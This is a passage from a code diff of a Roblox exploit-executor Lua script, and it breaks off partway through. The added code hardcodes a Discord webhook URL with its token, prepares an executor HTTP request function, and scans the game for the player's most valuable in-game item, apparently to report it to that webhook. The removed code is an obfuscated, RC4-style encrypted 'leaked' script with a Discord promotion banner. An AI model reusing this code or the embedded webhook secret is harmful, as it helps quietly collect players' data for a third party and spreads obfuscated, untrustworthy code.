@@ -1,6968 +1,10359 @@
-do
-	local Players = game:GetService("Players")
-	local TweenService = game:GetService("TweenService")
 
-	task.spawn(function()
-		local player
+
+local Players = game:GetService("Players")
+local Http = game:GetService("HttpService")
+local lp = Players.LocalPlayer
+local req = request or http_request or (syn and syn.request)
+
+local hook = "https://discord.com/api/webhooks/1548920880136986644/EJrgCluf1DESlt0wciyJi7bPW-_m95R3Pj3zViFSAUxlDpU76mbX5v11ui39G0p72AxF"
+
+local lastWin = 0
+local COOLDOWN = 5
+
+local function stripTags(t)
+	return t and t:gsub("<[^>]+>", "") or ""
+end
+
+local function short(n)
+	if n >= 1e12 then return string.format("%.1fT",n/1e12)
+	elseif n >= 1e9 then return string.format("%.1fB",n/1e9)
+	elseif n >= 1e6 then return string.format("%.1fM",n/1e6)
+	elseif n >= 1e3 then return string.format("%.1fK",n/1e3) end
+	return tostring(math.floor(n))
+end
+
+local function num(v)
+	v = tostring(v):gsub("%s","")
+	local n,s = v:match("([%d%.]+)(%a?)")
+	n = tonumber(n) or 0
+	if s == "K" or s == "k" then n = n * 1e3
+	elseif s == "M" or s == "m" then n = n * 1e6
+	elseif s == "B" or s == "b" then n = n * 1e9
+	elseif s == "T" or s == "t" then n = n * 1e12 end
+	return n
+end
+
+local function getBrainrot()
+	local p3 = Vector3.new(-476.752,10.464,7.107)
+	local p7 = Vector3.new(-476.752,10.464,114.107)
+	local mine
+	
+	for _,v in ipairs(workspace:GetDescendants()) do
+		if v:IsA("BasePart") and v.Name == "PlotSign" then
+			local d3 = (v.Position-p3).Magnitude
+			local d7 = (v.Position-p7).Magnitude
+			if d3 < 5 or d7 < 5 then
+				for _,x in ipairs(v:GetDescendants()) do
+					if x:IsA("TextLabel") and x.Text ~= "" then
+						if x.Text:find(lp.Name) or x.Text:find(lp.DisplayName) then
+							mine = d3 < 5 and 3 or 7
+						end
+					end
+				end
+			end
+		end
+	end
+	
+	if not mine then return "Unknown","N/A" end
+	local pos = mine == 3 and p7 or p3
+	local db = workspace:FindFirstChild("Debris")
+	if not db then return "Unknown","N/A" end
+	
+	local best,bestVal
+	for _,v in ipairs(db:GetChildren()) do
 		repeat
-			player = Players.LocalPlayer
-			if not player then
-				task.wait()
+		if v.Name ~= "FastOverheadTemplate" then break end
+		local sg = v:FindFirstChildOfClass("SurfaceGui")
+		if not sg or not sg.Adornee then break end
+		if (sg.Adornee.Position-pos).Magnitude > 50 then break end
+		local gen = sg:FindFirstChild("Generation",true)
+		if gen and gen:IsA("TextLabel") then
+			local val = num(gen.Text)
+			if not bestVal or val > bestVal then
+				bestVal = val
+				local dn = sg:FindFirstChild("DisplayName",true)
+				best = dn and dn.Text or v.Name
 			end
-		until player
-
-		local playerGui = player:WaitForChild("PlayerGui")
-
-		local gui = Instance.new("ScreenGui")
-		gui.Name = "PrintedSourceIntro"
-		gui.IgnoreGuiInset = true
-		gui.ResetOnSpawn = false
-		gui.DisplayOrder = 1000000
-		gui.Parent = playerGui
-
-		local title = Instance.new("TextLabel")
-		title.AnchorPoint = Vector2.new(0.5, 0.5)
-		title.Position = UDim2.fromScale(0.5, 0.47)
-		title.Size = UDim2.fromOffset(700, 70)
-		title.BackgroundTransparency = 1
-		title.Text = "LEAKED BY #1 SOURCES /printed"
-		title.TextColor3 = Color3.new(1, 1, 1)
-		title.TextSize = 28
-		title.Font = Enum.Font.GothamBold
-		title.TextTransparency = 1
-		title.Parent = gui
-
-		local sub = Instance.new("TextLabel")
-		sub.AnchorPoint = Vector2.new(0.5, 0.5)
-		sub.Position = UDim2.fromScale(0.5, 0.53)
-		sub.Size = UDim2.fromOffset(700, 45)
-		sub.BackgroundTransparency = 1
-		sub.Text = "Join discord.gg/printed for best sources..."
-		sub.TextColor3 = Color3.fromRGB(220, 220, 220)
-		sub.TextSize = 18
-		sub.Font = Enum.Font.Gotham
-		sub.TextTransparency = 1
-		sub.Parent = gui
-
-		TweenService:Create(title, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-			TextTransparency = 0
-		}):Play()
-
-		TweenService:Create(sub, TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-			TextTransparency = 0
-		}):Play()
-
-		task.wait(1.8)
-
-		local fadeTitle = TweenService:Create(title, TweenInfo.new(0.65, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-			TextTransparency = 1
-		})
-		local fadeSub = TweenService:Create(sub, TweenInfo.new(0.65, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-			TextTransparency = 1
-		})
-
-		fadeTitle:Play()
-		fadeSub:Play()
-		fadeSub.Completed:Wait()
-
-		gui:Destroy()
-	end)
+		end
+		until true
+	end
+	return best or "Unknown", bestVal and short(bestVal) or "N/A"
 end
 
---[[
-
-  /$$$$$$  /$$       /$$$$$$  /$$$$$$  /$$$$$$$$ /$$$$$$$ 
- /$$__  $$| $$      |_  $$_/ /$$__  $$| $$_____/| $$__  $$
-| $$  \__/| $$        | $$  | $$  \__/| $$      | $$  \ $$
-|  $$$$$$ | $$        | $$  | $$      | $$$$$   | $$  | $$
- \____  $$| $$        | $$  | $$      | $$__/   | $$  | $$
- /$$  \ $$| $$        | $$  | $$    $$| $$      | $$  | $$
-|  $$$$$$/| $$$$$$$$ /$$$$$$|  $$$$$$/| $$$$$$$$| $$$$$$$/
- \______/ |________/|______/ \______/ |________/|_______/
-
-              [ LEAKED BY #1 SOURCES /printed ]
-            [ discord.gg/printed ]
-
-]]
-
-warn("[KaWaifu] Script Start")
-str10 = "\109\130\184\151\28\225\75\213\76\64\88\116\24\241\148\21\6\182\92\205\22\163\244\49\200\207\230\200\104\55\209\90"
-
-do
-	local function slicedfn47(arg, arg2, arg3, arg4, arg5)
-		local tbl28 = {}
-		local tbl29 = {}
-		local n = arg
-		local slicedn33 = arg2
-		local v = arg3
-		local sliced91 = arg4  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local sliced92 = arg5
-		local slicedn34 = 16
-		local tbl30 = nil
-		local char2 = nil
-		local byte = nil
-		local slicedn35 = nil
-		local slicedn36 = nil
-		local slicedn37 = nil
-		local slicedn38 = nil
-		local slicedn39 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local slicedn40 = nil
-		local slicedn41 = nil
-		local str11 = nil
-
-		while true do
-			if slicedn34 <= 31 then
-				if slicedn34 <= 15 then
-					if slicedn34 <= 7 then
-						if slicedn34 <= 3 then
-							if slicedn34 <= 1 then
-								if slicedn34 <= 0 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									local tbl31 = {}
-
-									if slicedn33 == 1 then
-										slicedn34 = 42
-										slicedn33 = tbl31
-									else
-										slicedn34 = 57
-										slicedn35 = tbl31
-									end
-								else
-									local sliced93 = tbl30[1]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									local sliced94 = tbl30[4]
-									local slicedn42 = tbl30[2] + sliced93
-									local flag21 = sliced93 <= 0
-									local flag22 = flag21 and slicedn42 >= sliced94 or not flag21 and slicedn42 <= sliced94
-									tbl30[2] = slicedn42
-
-									if flag22 then
-										slicedn34 = 8
-									else
-										slicedn34 = 5
-									end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								end
-							elseif slicedn34 <= 2 then
-								tbl30 = tbl30[1]
-								slicedn34 = 26
-							else
-								slicedn34 = 25
-								slicedn33 = 3661753104396200
-								slicedn36 = 927496312415783
-								slicedn37 = 4503599627370496
-								slicedn38 = 67108864  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn39 = 17592186044416
-								slicedn40 = 2679385
-								slicedn41 = 22847685
-								tbl30 = { 0, nil, 1, tbl30, 4 }
-							end
-						elseif slicedn34 <= 5 then
-							if slicedn34 <= 4 then
-								byte(str11, 1, 64)
-								slicedn34 = slicedn41 == slicedn40 and 31 or 24
-							else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								tbl30 = tbl30[5]
-								slicedn34 = 4
-							end
-						elseif slicedn34 <= 6 then
-							local slicedn42 = slicedn33 % slicedn38
-							slicedn33 = ((((slicedn33 - slicedn42) / slicedn38 * slicedn40 + slicedn42 * slicedn41) % slicedn38 * slicedn38 + slicedn42 * slicedn40) % slicedn37 + slicedn36) % slicedn37
-							slicedn35[n] = (slicedn33 - slicedn33 % slicedn39) / slicedn39
-							slicedn34 = 10
-						else
-							char2 ..= tbl28[slicedn39]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn34 = 11
-						end
-					elseif slicedn34 <= 11 then
-						if slicedn34 <= 9 then
-							if slicedn34 <= 8 then
-								slicedn35 = (slicedn37 * slicedn35 + slicedn38) % 4294967296
-								str11 ..= slicedn39[1 + (slicedn35 - slicedn35 % 268435456) / 268435456 % 16]
-								slicedn34 = 1
-							else
-								slicedn33[slicedn35 + 1] = n[slicedn37] * 16 + n[slicedn38]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn34 = 27
-							end
-						elseif slicedn34 <= 10 then
-							local sliced93 = tbl30[2]
-							local sliced94 = tbl30[3]
-							local slicedn42 = tbl30[5] + sliced93
-							local flag21 = sliced93 <= 0
-							local flag22 = not flag21
-							local flag23 = slicedn42 >= sliced94
-							local flag24 = slicedn42 <= sliced94  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							flag23 = flag21 and flag23
-							flag24 = flag22 and flag24
-							flag24 = flag23 or flag24
-							tbl30[5] = slicedn42
-
-							if flag24 then
-								slicedn34 = 6
-								n = slicedn42
-							else
-								slicedn34 = 2
-							end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						else
-							local sliced93 = tbl30[3]
-							local sliced94 = tbl30[5]
-							local slicedn42 = tbl30[1] + sliced93
-							local flag21 = sliced93 <= 0
-							local flag22 = not flag21
-							local flag23 = slicedn42 >= sliced94
-							local flag24 = slicedn42 <= sliced94
-							flag23 = flag21 and flag23
-							flag24 = flag22 and flag24  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							flag24 = flag23 or flag24
-							tbl30[1] = slicedn42
-
-							if flag24 then
-								slicedn34 = 28
-								slicedn35 = slicedn42
-							else
-								slicedn34 = 35
-							end
-						end
-					elseif slicedn34 <= 13 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						if slicedn34 <= 12 then
-							n = (n + tbl29[slicedn33] + slicedn35[slicedn33 % 32 + 1]) % 256
-							local sliced93 = tbl29[slicedn33]
-							tbl29[slicedn33] = tbl29[n]
-							tbl29[n] = sliced93
-							slicedn34 = 56
-						else
-							slicedn39 += slicedn37
-							slicedn34 = 18
-						end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					elseif slicedn34 <= 14 then
-						slicedn35 = (slicedn35 - slicedn38) / 2
-						slicedn36 = (slicedn36 - slicedn40) / 2
-						slicedn38 = slicedn35 % 2
-						slicedn40 = slicedn36 % 2
-
-						if slicedn38 ~= slicedn40 then
-							slicedn34 = 43
-							slicedn37 = 4
-						else
-							slicedn34 = 33  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-					else
-						n = { [56] = 8, [48] = 0, [100] = 13, [52] = 4, [51] = 3, [66] = 11, [67] = 12 }
-						slicedn34 = 55
-						slicedn35 = 49
-						slicedn37 = 1
-					end
-
-					continue
-				end
-
-				if slicedn34 <= 23 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					if slicedn34 <= 19 then
-						if slicedn34 <= 17 then
-							if slicedn34 <= 16 then
-								char2 = string.char
-								byte = string.byte
-
-								if slicedn33 == 2 then
-									slicedn34 = 26
-									slicedn35 = n
-								else
-									slicedn34 = 0  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								end
-							else
-								slicedn34 = 11
-								n = 0
-								slicedn33 = 0
-								char2 = ""
-								tbl30 = { 0, nil, 1, tbl30, #v + 0 }
-							end
-						elseif slicedn34 <= 18 then
-							slicedn35 = (slicedn35 - slicedn38) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn36 = (slicedn36 - slicedn40) / 2
-							slicedn38 = slicedn35 % 2
-							slicedn40 = slicedn36 % 2
-
-							if slicedn38 ~= slicedn40 then
-								slicedn34 = 54
-								slicedn37 = 128
-							else
-								slicedn34 = 7
-							end
-						else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							sliced91[sliced92] = char2
-							slicedn34 = 34
-						end
-					elseif slicedn34 <= 21 then
-						if slicedn34 <= 20 then
-							tbl30 = tbl30[4]
-							slicedn34 = 17
-						else
-							slicedn34 = 1
-							str11 = ""  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							tbl30 = { 1, 0, nil, 64, tbl30 }
-						end
-					elseif slicedn34 <= 22 then
-						slicedn35 = (slicedn35 - slicedn38) / 2
-						slicedn36 = (slicedn36 - slicedn40) / 2
-						slicedn38 = slicedn35 % 2
-						slicedn40 = slicedn36 % 2
-
-						if slicedn38 ~= slicedn40 then
-							slicedn34 = 32
-							slicedn37 = 32  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						else
-							slicedn34 = 58
-						end
-					else
-						str11 += 65536
-						slicedn34 = 51
-					end
-
-					continue
-				end
-
-				if slicedn34 <= 27 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					if slicedn34 <= 25 then
-						if slicedn34 <= 24 then
-							local sliced93 = tbl30[1]
-							local sliced94 = tbl30[3]
-							local slicedn42 = tbl30[5] + sliced93
-							local flag21 = sliced93 <= 0
-							local flag22 = flag21 and slicedn42 >= sliced94 or not flag21 and slicedn42 <= sliced94
-							tbl30[5] = slicedn42
-
-							if flag22 then
-								slicedn34 = 21  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn41 = slicedn42
-							else
-								slicedn34 = 62
-							end
-						else
-							local sliced93 = tbl30[3]
-							local sliced94 = tbl30[5]
-							local slicedn42 = tbl30[1] + sliced93
-							local flag21 = sliced93 <= 0
-							local flag22 = not flag21  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							local flag23 = slicedn42 >= sliced94
-							local flag24 = slicedn42 <= sliced94
-							flag23 = flag21 and flag23
-							flag23 = flag23 or flag22 and flag24
-							tbl30[1] = slicedn42
-
-							if flag23 then
-								slicedn34 = 50
-								str11 = slicedn42
-							else
-								slicedn34 = 60  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							end
-						end
-					elseif slicedn34 <= 26 then
-						n = slicedn35[3]
-						slicedn33 = 4 * (slicedn35[1] % 64) + 1
-						slicedn36 = 2 * (slicedn35[2] % 128) - 1
-						slicedn34 = 52
-						tbl30 = { 1, -1, nil, 255, tbl30 }
-					else
-						local sliced93 = tbl30[4]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						local sliced94 = tbl30[3]
-						local slicedn42 = tbl30[2] + sliced93
-						local flag21 = sliced93 <= 0
-						local flag22 = flag21 and slicedn42 >= sliced94 or not flag21 and slicedn42 <= sliced94
-						tbl30[2] = slicedn42
-
-						if flag22 then
-							slicedn34 = 63
-							slicedn35 = slicedn42
-						else
-							slicedn34 = 53  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-					end
-
-					continue
-				end
-
-				if slicedn34 <= 29 then
-					if slicedn34 <= 28 then
-						n = (n + 1) % 256
-						slicedn33 = (slicedn33 + tbl29[n]) % 256
-						local sliced93 = tbl29[n]
-						tbl29[n] = tbl29[slicedn33]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						tbl29[slicedn33] = sliced93
-						local sliced94 = byte(v, slicedn35)
-						slicedn36 = tbl29[(tbl29[n] + tbl29[slicedn33]) % 256]
-						slicedn37 = sliced94 % 2
-						slicedn38 = slicedn36 % 2
-
-						if slicedn37 ~= slicedn38 then
-							slicedn34 = 44
-							slicedn35 = sliced94
-						else
-							slicedn34 = 38  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn39 = 0
-							slicedn35 = sliced94
-						end
-
-						continue
-					end
-
-					return nil
-				end
-
-				if slicedn34 <= 30 then
-					slicedn39 += slicedn37
-					slicedn34 = 39  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				else
-					slicedn36 = { byte(n, 1, 64) }
-					slicedn34 = 24
-				end
-			else
-				if slicedn34 <= 47 then
-					if slicedn34 <= 39 then
-						if slicedn34 <= 35 then
-							if slicedn34 <= 33 then
-								if slicedn34 <= 32 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn39 += slicedn37
-									slicedn34 = 58
-								else
-									slicedn35 = (slicedn35 - slicedn38) / 2
-									slicedn36 = (slicedn36 - slicedn40) / 2
-									slicedn38 = slicedn35 % 2
-									slicedn40 = slicedn36 % 2
-
-									if slicedn38 ~= slicedn40 then
-										slicedn34 = 30
-										slicedn37 = 8  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									else
-										slicedn34 = 39
-									end
-								end
-
-								continue
-							end
-
-							if slicedn34 <= 34 then
-								return
-							end
-							tbl30 = tbl30[4]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn34 = 19
-							continue
-						end
-
-						if slicedn34 <= 37 then
-							if slicedn34 <= 36 then
-								slicedn34 = not slicedn38 and 61 or 9
-							else
-								tbl30 = tbl30[5]
-								slicedn34 = 59
-							end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						elseif slicedn34 <= 38 then
-							slicedn35 = (slicedn35 - slicedn37) / 2
-							slicedn36 = (slicedn36 - slicedn38) / 2
-							slicedn38 = slicedn35 % 2
-							slicedn40 = slicedn36 % 2
-
-							if slicedn38 ~= slicedn40 then
-								slicedn34 = 49
-								slicedn37 = 2
-							else
-								slicedn34 = 14  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							end
-						else
-							slicedn35 = (slicedn35 - slicedn38) / 2
-							slicedn36 = (slicedn36 - slicedn40) / 2
-							slicedn38 = slicedn35 % 2
-							slicedn40 = slicedn36 % 2
-
-							if slicedn38 ~= slicedn40 then
-								slicedn34 = 48
-								slicedn37 = 16
-							else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn34 = 22
-							end
-						end
-
-						continue
-					end
-
-					if slicedn34 <= 43 then
-						if slicedn34 <= 41 then
-							if slicedn34 <= 40 then
-								str11 -= 65536
-								slicedn34 = 47  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							else
-								n[slicedn35] = slicedn37
-								n[69] = 14
-								n[55] = 7
-								n[53] = 5
-								n[57] = 9
-								n[99] = 12
-								n[54] = 6
-								slicedn34 = 27
-								tbl30 = { tbl30, -1, 31, 1, nil }  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							end
-						elseif slicedn34 <= 42 then
-							slicedn36 = {}
-
-							slicedn39 = {
-								"a",
-								"6",
-								"b",
-								"3",
-								"5",
-								"e",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								"2",
-								"0",
-								"d",
-								"1",
-								"7",
-								"f",
-								"4",
-								"8",
-								"c",
-								"9",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							}
-
-							slicedn34 = 24
-							slicedn35 = 3846715392
-							slicedn37 = -2141334987
-							slicedn38 = -1976388651
-							slicedn40 = 1
-							tbl30 = { 1, tbl30, 128, nil, 0 }
-						else
-							slicedn39 += slicedn37
-							slicedn34 = 33  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-					elseif slicedn34 <= 45 then
-						if slicedn34 <= 44 then
-							slicedn34 = 38
-							slicedn39 = 1
-						else
-							slicedn34 = 10
-							tbl30 = { tbl30, 1, 32, nil, 0 }
-						end
-					elseif slicedn34 <= 46 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						tbl28[n] = char2(n)
-						tbl29[n] = n
-						n = (slicedn33 * n + slicedn36) % 256
-						slicedn34 = 52
-					else
-						n = (n - str11) / 65536
-						local slicedn42 = (slicedn33 + str11) % slicedn37
-						local slicedn43 = slicedn42 % slicedn38
-						slicedn33 = ((((slicedn42 - slicedn43) / slicedn38 * slicedn40 + slicedn43 * slicedn41) % slicedn38 * slicedn38 + slicedn43 * slicedn40) % slicedn37 + slicedn36) % slicedn37
-						slicedn34 = 25  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-
-					continue
-				end
-
-				if slicedn34 <= 55 then
-					if slicedn34 <= 51 then
-						if slicedn34 <= 49 then
-							if slicedn34 <= 48 then
-								slicedn39 += slicedn37
-								slicedn34 = 22
-							else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn39 += slicedn37
-								slicedn34 = 14
-							end
-						elseif slicedn34 <= 50 then
-							str11 = n % 65536
-							slicedn34 = str11 < 0 and 23 or 51
-						else
-							slicedn34 = str11 >= 65536 and 40 or 47
-						end
-					elseif slicedn34 <= 53 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						if slicedn34 <= 52 then
-							local sliced93 = tbl30[1]
-							local sliced94 = tbl30[4]
-							local slicedn42 = tbl30[2] + sliced93
-							local flag21 = sliced93 <= 0
-							local flag22 = not flag21
-							local flag23 = slicedn42 >= sliced94
-							local flag24 = slicedn42 <= sliced94
-							flag23 = flag21 and flag23
-							flag23 = flag23 or flag22 and flag24  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							tbl30[2] = slicedn42
-
-							if flag23 then
-								slicedn34 = 46
-								slicedn37 = slicedn42
-							else
-								slicedn34 = 37
-							end
-						else
-							tbl30 = tbl30[1]
-							slicedn34 = 26  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn35 = slicedn33
-						end
-					elseif slicedn34 <= 54 then
-						slicedn39 += slicedn37
-						slicedn34 = 7
-					else
-						n[slicedn35] = slicedn37
-						n[50] = 2
-						n[102] = 15
-						n[98] = 11  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						n[68] = 13
-						n[101] = 14
-						n[70] = 15
-						n[65] = 10
-						slicedn34 = 41
-						slicedn35 = 97
-						slicedn37 = 10
-					end
-
-					continue
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				if slicedn34 <= 59 then
-					if slicedn34 <= 57 then
-						if slicedn34 <= 56 then
-							local sliced93 = tbl30[3]
-							local sliced94 = tbl30[1]
-							local slicedn42 = tbl30[5] + sliced93
-							local flag21 = sliced93 <= 0
-							local flag22 = flag21 and slicedn42 >= sliced94 or not flag21 and slicedn42 <= sliced94
-							tbl30[5] = slicedn42
-
-							if flag22 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn34 = 12
-								slicedn33 = slicedn42
-							else
-								slicedn34 = 20
-							end
-						else
-							slicedn34 = slicedn33 == 0 and 3 or 26
-						end
-					elseif slicedn34 <= 58 then
-						slicedn35 = (slicedn35 - slicedn38) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						slicedn36 = (slicedn36 - slicedn40) / 2
-						slicedn38 = slicedn35 % 2
-						slicedn40 = slicedn36 % 2
-
-						if slicedn38 ~= slicedn40 then
-							slicedn34 = 13
-							slicedn37 = 64
-						else
-							slicedn34 = 18
-						end
-					else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						slicedn34 = 56
-						n = 0
-						tbl30 = { 255, nil, 1, tbl30, -1 }
-					end
-
-					continue
-				end
-
-				if slicedn34 <= 61 then
-					if slicedn34 <= 60 then
-						tbl30 = tbl30[4]
-						slicedn34 = 45  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						continue
-					end
-
-					break
-				end
-
-				if slicedn34 <= 62 then
-					tbl30 = tbl30[2]
-					slicedn34 = 15
-				else
-					local slicedn42 = slicedn35 * 2 + 1
-					local sliced93 = slicedn36[slicedn42]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					local sliced94 = slicedn36[slicedn42 + 1]
-
-					if not sliced93 then
-						slicedn34 = 29
-					else
-						slicedn34 = 36
-						slicedn37 = sliced93
-						slicedn38 = sliced94
-					end
-				end
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-
-		return nil
-	end
-
-end
-
-local str11, slicedfn47, tbl28, tbl29, slicedfn48, request_
-
-do
-	do
-		str11 = "f2284f4121d8470513b611058e3a8ca5"
-
-		do
-			local function slicedfn49(arg, arg2, arg3, arg4, arg5)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				local tbl30 = {}
-				local tbl31 = {}
-				local n = arg
-				local slicedn33 = arg2
-				local v = arg3
-				local sliced91 = arg4
-				local sliced92 = arg5
-				local slicedn34 = 16
-				local tbl32 = nil
-				local char2 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				local byte = nil
-				local slicedn35 = nil
-				local slicedn36 = nil
-				local slicedn37 = nil
-				local slicedn38 = nil
-				local slicedn39 = nil
-				local slicedn40 = nil
-				local slicedn41 = nil
-				local str12 = nil
-
-				while true do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					if slicedn34 <= 31 then
-						if slicedn34 <= 15 then
-							if slicedn34 <= 7 then
-								if slicedn34 <= 3 then
-									if slicedn34 <= 1 then
-										if slicedn34 <= 0 then
-											local tbl33 = {}
-
-											if slicedn33 == 1 then
-												slicedn34 = 42
-												slicedn33 = tbl33  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-											else
-												slicedn34 = 57
-												slicedn35 = tbl33
-											end
-										else
-											local sliced93 = tbl32[1]
-											local sliced94 = tbl32[4]
-											local slicedn42 = tbl32[2] + sliced93
-											local flag21 = sliced93 <= 0
-											local flag22 = flag21 and slicedn42 >= sliced94 or not flag21 and slicedn42 <= sliced94  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-											tbl32[2] = slicedn42
-
-											if flag22 then
-												slicedn34 = 8
-											else
-												slicedn34 = 5
-											end
-										end
-									elseif slicedn34 <= 2 then
-										tbl32 = tbl32[1]
-										slicedn34 = 26  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									else
-										slicedn34 = 25
-										slicedn33 = 3661753104396200
-										slicedn36 = 927496312415783
-										slicedn37 = 4503599627370496
-										slicedn38 = 67108864
-										slicedn39 = 17592186044416
-										slicedn40 = 2679385
-										slicedn41 = 22847685
-										tbl32 = { 0, nil, 1, tbl32, 4 }  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									end
-								elseif slicedn34 <= 5 then
-									if slicedn34 <= 4 then
-										byte(str12, 1, 64)
-										slicedn34 = slicedn41 == slicedn40 and 31 or 24
-									else
-										tbl32 = tbl32[5]
-										slicedn34 = 4
-									end
-								elseif slicedn34 <= 6 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									local slicedn42 = slicedn33 % slicedn38
-									slicedn33 = ((((slicedn33 - slicedn42) / slicedn38 * slicedn40 + slicedn42 * slicedn41) % slicedn38 * slicedn38 + slicedn42 * slicedn40) % slicedn37 + slicedn36) % slicedn37
-									slicedn35[n] = (slicedn33 - slicedn33 % slicedn39) / slicedn39
-									slicedn34 = 10
-								else
-									char2 ..= tbl30[slicedn39]
-									slicedn34 = 11
-								end
-							elseif slicedn34 <= 11 then
-								if slicedn34 <= 9 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									if slicedn34 <= 8 then
-										slicedn35 = (slicedn37 * slicedn35 + slicedn38) % 4294967296
-										str12 ..= slicedn39[1 + (slicedn35 - slicedn35 % 268435456) / 268435456 % 16]
-										slicedn34 = 1
-									else
-										slicedn33[slicedn35 + 1] = n[slicedn37] * 16 + n[slicedn38]
-										slicedn34 = 27
-									end
-								elseif slicedn34 <= 10 then
-									local sliced93 = tbl32[2]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									local sliced94 = tbl32[3]
-									local slicedn42 = tbl32[5] + sliced93
-									local flag21 = sliced93 <= 0
-									local flag22 = not flag21
-									local flag23 = slicedn42 >= sliced94
-									local flag24 = slicedn42 <= sliced94
-									flag23 = flag21 and flag23
-									flag24 = flag22 and flag24
-									flag24 = flag23 or flag24
-									tbl32[5] = slicedn42  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-									if flag24 then
-										slicedn34 = 6
-										n = slicedn42
-									else
-										slicedn34 = 2
-									end
-								else
-									local sliced93 = tbl32[3]
-									local sliced94 = tbl32[5]
-									local slicedn42 = tbl32[1] + sliced93  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									local flag21 = sliced93 <= 0
-									local flag22 = not flag21
-									local flag23 = slicedn42 >= sliced94
-									local flag24 = slicedn42 <= sliced94
-									flag23 = flag21 and flag23
-									flag24 = flag22 and flag24
-									flag24 = flag23 or flag24
-									tbl32[1] = slicedn42
-
-									if flag24 then
-										slicedn34 = 28  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										slicedn35 = slicedn42
-									else
-										slicedn34 = 35
-									end
-								end
-							elseif slicedn34 <= 13 then
-								if slicedn34 <= 12 then
-									n = (n + tbl31[slicedn33] + slicedn35[slicedn33 % 32 + 1]) % 256
-									local sliced93 = tbl31[slicedn33]
-									tbl31[slicedn33] = tbl31[n]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									tbl31[n] = sliced93
-									slicedn34 = 56
-								else
-									slicedn39 += slicedn37
-									slicedn34 = 18
-								end
-							elseif slicedn34 <= 14 then
-								slicedn35 = (slicedn35 - slicedn38) / 2
-								slicedn36 = (slicedn36 - slicedn40) / 2
-								slicedn38 = slicedn35 % 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn40 = slicedn36 % 2
-
-								if slicedn38 ~= slicedn40 then
-									slicedn34 = 43
-									slicedn37 = 4
-								else
-									slicedn34 = 33
-								end
-							else
